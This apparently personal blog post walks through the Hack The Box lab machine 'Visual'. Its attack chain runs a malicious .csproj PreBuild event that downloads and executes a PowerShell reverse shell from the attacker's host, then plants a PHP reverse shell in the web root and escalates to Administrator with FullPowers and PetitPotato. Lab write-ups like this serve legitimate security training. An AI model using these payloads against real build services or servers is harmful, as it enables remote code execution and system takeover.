---
date: 2024-02-24T19:37:32-06:00
# description: ""
# image: ""
lastmod: 2025-03-19
showTableOfContents: true
# tags: ["",]
# categories: [""]
title: "HTB: Visual"
type: "post"
---

* Platform: Hack The Box
* Link: [Visual](https://app.hackthebox.com/machines/Visual)
* Level: Medium
* OS: Windows
---

Target IP address is `10.10.11.234`

## Scanning

```
sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234
```
I run my usual scan and I get some information:
- Apache web server is running on the target
- It is a Windows machine (Though you can see that on the machine page)
- A PHP application is hosted on the machine running on port 80

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 19:13 MST
Nmap scan report for 10.10.11.234
Host is up (0.047s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
```

## Enumeration

We get to the web application by visiting `http://10.10.11.234`. The application appears to be a service allowing users to submit a Git repo URL, it will then compile the .NET project from for the user.

![Visual Webapp](/images/HTB-Visual/Visual-webapp.png)

I test the functionality by sending a custom URL, using the Python3.
```
python3 -m http.server
```

I then submit my link `http://10.10.14.222:8000` (Replace `10.10.14.222` by your IP address)

![Link-submit1](/images/HTB-Visual/link-submit-Visual-1.png)

It redirects me to this page, where the application tries to compiles my project.
![Build attempt](/images/HTB-Visual/Visual-build-attempt.png)

Because there is no project at this URL the operation fails but I get some information. This application looks for a `.sln` file.

> A .sln file is a solution file used by Microsoft Visual Studio. The file serves as a container for one or more projects. It helps organize and manage related projects within a single workspace. The `.sln` file stores information about the projects contained within it, including their dependencies, build configurations, and references to external libraries or resources.

![Build failure](/images/HTB-Visual/Visual-build-failure.png)

I can see what I received from the application back on my server.

![Get method server](/images/HTB-Visual/python3server-GET-method-1.png)

I see a code 404, because no file was found at my URL and `GET /info/refs?service=git-upload-pack HTTP/1.1" 404`. It seems that the application is using the `git-upload-pack` service which is a part of the Git protocol used for operations like cloning or fetching changes from a remote repository. Read more about it [here](https://git-scm.com/docs/git-upload-pack).


From the application page we gather that our link must lead to a .NET 6.0 project with a `.sln` file.

![Visual support](/images/HTB-Visual/Visual-dotnet-support.png)

## Initial Foothold

I never used .NET so I asked ChatGPT to show me how to create projects for it.

```
dotnet new sln -n visual
```

When you run the command `dotnet new sln -n visual`, it creates a new solution file named `visual.sln`.
![Dotnet new sln](/images/HTB-Visual/dotnet-new-sln.png)

```
dotnet new console -n visual
```

This command creates a new console application project named `visual`. This project will contain the necessary files and configurations for a basic console application written in C#.

![Dotnet new console](/images/HTB-Visual/dotnet-new-console.png)

We add the `visual.csproj` project file located in the `visual` directory to the solution file (`visual.sln`). 

```
dotnet sln add visual/visual.csproj
```
![Dotnet sln add](/images/HTB-Visual/dotnet-sln-add.png)

> In .NET projects, a `.csproj` file is a project file that is used to define and configure the project. It is an XML-based file that contains metadata and settings about the project, such as its dependencies, build settings, target framework, and more.


`git init` is used to initialize a new Git repository.
```
git init
```
![Visual git init](/images/HTB-Visual/visual-git-init.png)

We need to find a way to serve our Git repo to the application I found a great blog post about it here, [A Quick and Hacky Way to Serve a Git Repo over HTTP](https://theartofmachinery.com/2016/07/02/git_over_http.html).

We now run these commands
```
git add .
git commit -m "Test"
cd .git
git --bare update-server-info
cd ..
```

> We will have to run them every time we make any changes to our files.
When you run `git --bare update-server-info`, Git updates the auxiliary files necessary for serving the repository over the network.

Run your python server again with `python3 -m http.server` and submit your URL now that we have the right files.

```
http://10.10.14.222:8000/.git
```
![Visual link submit2](/images/HTB-Visual/url-submission-visual1.png)

<br>

The building process is successful this time.

![Visual successful build](/images/HTB-Visual/visual-building-successful.png)

Back on our server we get some successful GET requests.

![Server good requests](/images/HTB-Visual/server-good-requests.png)

I can see that the application is compiling the files in the git repo. We need to find a way to exploit this process. After some googling, I found this [Microsoft page](https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022) explaining that a "pre-build event" refers to a script or command that is executed before the build process for the project begins.

We can use a `PreBuild` event in the `.csproj` file to execute some commands. So let's try to add a reverse shell. 

- Below is my modified `.csproj` file
```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.222:8000/revshell.ps1')" />
  </Target>

</Project>
```

- Let's create a `revshell.ps1` PowerShell script to get a remote shell. I used this [nishang shell](https://github.com/K-Scorpio/scripts-collection/blob/main/revshell.ps1) for the reverse shell. I took this [shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), changed the function name and added the reverse switch at the end.

I setup a netcat listener with

```
nc -nvlp 9001
```

We use the git commands again

```
git add .
git commit -m "Add as a test"
cd .git
git --bare update-server-info
cd ..
```

If you stopped your Python server start it again (and leave it running) and submit your link.

The listener should catch a shell after the compilation is done, we are in!

![nc listener, reverse shell](/images/HTB-Visual/nc-listener-shell.png)


Running `whoami` I see that I'm currently connected as the user `enox`.

![whoami command on target](/images/HTB-Visual/target-whoami.png)

We can check our privileges with `whoami /priv`.
![privilege on target machine](/images/HTB-Visual/target-priv.png)

I go to the user main directory with `cd \Users\enox` and I use `ls` to see the different subdirectories.

![directories listing on target](/images/HTB-Visual/target-directories.png)

I check the content of the `Desktop` directory with `dir Desktop` and I can see the `user.txt` flag. Use `cat user.txt` to check its content.

![User flag](/images/HTB-Visual/Visual-user-flag.png)

### Lateral Movement

To find privilege escalation paths let's use [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20240223-ab2bb023) . Get `WinPEASany.exe` and store it in the repository that you are using for your python server.

![winPEAS location](/images/HTB-Visual/winPEAS-location.png)

Get it to the target with `wget`.
```
wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
```

> Use your IP address and replace the port by the one you are using for your server

Verify that the file is on the target.

![winPEAS location on target](/images/HTB-Visual/winPEAS-on-target.png)

You can check the options of winPEAS with `./wpany.exe -h`.

![winPEAS options](/images/HTB-Visual/winpeas-options.png)

Run it with the options you want, Because I want a somewhat thorough enumeration I am using this command
```
./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
```

It seems that we have permissions to the directory containing the Apache HTTP Server service.

![Apache Server HTTP](/images/HTB-Visual/ApacheServerHTTP.png)

Going through the output you can notice that you have full access to the `xampp` directory (remember this is a PHP application), the same folder storing Apache. 

![xampp directory](/images/HTB-Visual/xampp-permissions.png)

We can attempt to learn more about `ApacheHTTPServer` with
```
Get-CIMInstance -Class Win32_Service -Filter "Name='ApacheHTTPServer'" | Select-Object *
```

This is the output we get, it seems like it runs under `NT AUTHORITY\Local Service`.

![Apache HTTP Server service info](/images/HTB-Visual/AppacheHTTPServer-info-1.png)

> "On Windows 10, the UPnP Device Host service is configured to execute without impersonation privileges as the user `NT AUTHORITY\LOCAL SERVICE`...". Basically we can achieve privilege escalation via this account. Read more about it [here](https://itm4n.github.io/localservice-privileges/).

The service runs under `NT AUTHORITY\Local Service` so we need to escalate to that account. Since we have access to the `xampp` directory we can plant a reverse shell there and access it through the web browser. I go to that directory and list its content.

> In PHP applications, the XAMPP folder serves as the root directory for hosting web files (such as HTML, PHP, CSS, JavaScript, images, etc.) and managing server configuration settings.

```
cd C:\Xampp\
ls
```
![xampp directory content](/images/HTB-Visual/xampp-content-1.png)

Notice the `htdocs` folder.

> In XAMPP, the `htdocs` directory serves as the default web server document root. This means that any files placed within the `htdocs` directory will be accessible through a web browser when the XAMPP server is running.

The application files are here as you can see. We can put a PHP reverse shell in the `htdocs` directory.

![xampp htdocs directory](/images/HTB-Visual/xampp-htdocs.png)

This is the [PHP reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) I used. 

I then run `wget http://10.10.14.222:8000/revshell.php -o rev.php` to get it to the target.

![PHP reverse shell on the target](/images/HTB-Visual/php-reverse-shell-1.png)

Let's setup a netcat listener with 
```
nc -nvlp 8010
```

> Use the port number that you specified in the PHP reverse shell.

Go back to the browser and go to `http://<target IP address>/rev.php`, come back to your listener and you should have a shell with the user `nt authority\local service`.

![nt authority user shell on the target](/images/HTB-Visual/nt-authority-local-service.png)

Check your privileges and you notice that you lack the `ImpersonatePrivilege` needed to get administrative privileges.

Let's run `whoami /priv`.

![nt authority user privileges](/images/HTB-Visual/nt-authority-priv.png)

## Privilege Escalation

This [blog](https://itm4n.github.io/localservice-privileges/) post gives you the link to a tool used to obtain more privileges. The tool is called [FullPowers](https://github.com/itm4n/FullPowers). Get it on the target machine (Make sure to use the reverse shell with `nt authority\local service`).

> We do not want the executable to be accessible through the browser so we `cd ..` back to the `xampp` directory before downloading our file.

```
wget http://10.10.14.222:8000/FullPowers.exe -o fp.exe
```

I get an error because we currently have a cmd shell and not a PowerShell one.

![nt authority user shell error](/images/HTB-Visual/shell-error-1.png)

Just run `powershell` and rerun the `wget` command.

![nt authority FullPowers dlownload](/images/HTB-Visual/powershell-fullpowers-dl.png)

Now we execute `fp.exe` and we get new privileges! Notice that it downgraded us again to a cmd shell and it also forced us out of the `xampp` folder, so we need to run `powershell` and `cd C:\xampp`.

![nt authority user new privileges](/images/HTB-Visual/nt-authority-new-priv.png)

Now we can use [PetitPotato](https://github.com/wh0amitz/PetitPotato) to achieve privilege escalation by abusing impersonate privileges.

We get it to the target by running

```
wget http://10.10.14.222:8000/PetitPotato.exe -o pp.exe
```
However we get an error

```
wget : Win32 internal error "Access is denied" 0x5 occurred while reading the console output buffer. Contact Microsoft 
```

It seems that this error is caused by the progress bar displayed on the terminal. It can be solved by running `$ProgressPreference = "SilentlyContinue"` before the `wget` command.

We can now use our file by running

```
./pp.exe 3 cmd
```
![PetitPotato exploit](/images/HTB-Visual/PetitPotato-exploit.png)

We now have admin privileges, let's check.

```
cd C:\Users\Administrator\Desktop
```

Then let's list the content of the directory, we got downgraded to a cmd shell again so we have to use `dir`.

![root flag](/images/HTB-Visual/root-flag.png)

We find the `root.txt`! Use `type root.txt` to see it.

That's it for my first Hack The Box writeup! I hope it was helpful. If you have any questions leave a comment or reach me on X [@_KScorpio](https://twitter.com/_KScorpio).
